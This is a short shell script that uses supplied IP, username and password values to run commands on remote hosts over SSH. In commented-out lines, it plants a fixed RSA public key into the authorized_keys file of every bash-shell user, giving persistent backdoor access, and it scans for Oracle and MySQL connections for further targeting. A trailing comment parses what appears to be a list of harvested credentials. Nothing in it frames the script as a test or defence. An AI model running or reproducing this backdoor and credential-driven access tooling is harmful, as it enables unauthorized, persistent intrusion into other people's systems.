ip="$1"
user="$2"
pswd="$3"

#node  ./tools/ssh2Cmd.js --port 22 --host $ip --username "${user}" --password "$pswd" --cmd "cat /etc/passwd|grep '/bash'|cut -d: -f6|xargs -I {} bash -c 'mkdir {}/.ssh 2>/dev/null;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001>{}/.ssh/authorized_keys;chmod 600 {}/.ssh/authorized_keys'"
#node  ./tools/ssh2Cmd.js --port 22 --host $ip --username "${user}" --password "$pswd" --cmd 'hostname -i;netstat -antp|grep -E ":(1521|3306)"|grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):(1521|3306)"|sort -u'
node  ./tools/ssh2Cmd.js --port 22 --host $ip --username "${user}" --password "$pswd" --cmd 'hostname -i;ping -c 2 180.97.33.108'

# cat /mysvn/22U_P.txt|sed 's/"//g'|awk -F ',' '{print $1" "$4" "$5}'|sort -u
